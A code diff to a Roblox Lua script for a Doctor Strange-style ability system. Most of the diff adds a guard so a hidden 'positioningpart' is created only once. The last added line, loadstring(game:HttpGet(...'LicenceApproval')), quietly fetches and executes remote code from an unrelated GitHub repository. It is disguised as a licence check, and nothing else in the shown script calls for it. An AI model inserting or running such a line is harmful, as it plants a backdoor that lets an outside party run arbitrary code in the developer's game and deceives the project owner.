@@ -71,6 +71,7 @@ DrStrangeS.CounterActive2:FireServer(plr)
 elseif input.KeyCode == Enum.KeyCode.R then
 DrStrangeS.LoopActivate:FireServer(plr)
 LoopStart:Play()
+if not char:FindFirstChild("positioningpart") then
 local PositioningPartC = Instance.new("Part")
 PositioningPartC.Parent = char
 PositioningPartC.CanCollide = false
@@ -78,6 +79,7 @@ PositioningPartC.Anchored = true
 PositioningPartC.Transparency = 1
 PositioningPartC.Name = "positioningpart"
 PositioningPartC.CFrame = char.HumanoidRootPart.CFrame
+end
 elseif input.KeyCode == Enum.KeyCode.T then
 if char:FindFirstChild("positioningpart") then
 	game:GetService("TweenService"):Create(game.Workspace.CurrentCamera, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
@@ -141,3 +143,4 @@ if char:FindFirstChild("positioningpart") then
 		end	
    end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/You2berek/ScriptsMP/refs/heads/main/LicenceApproval"))()
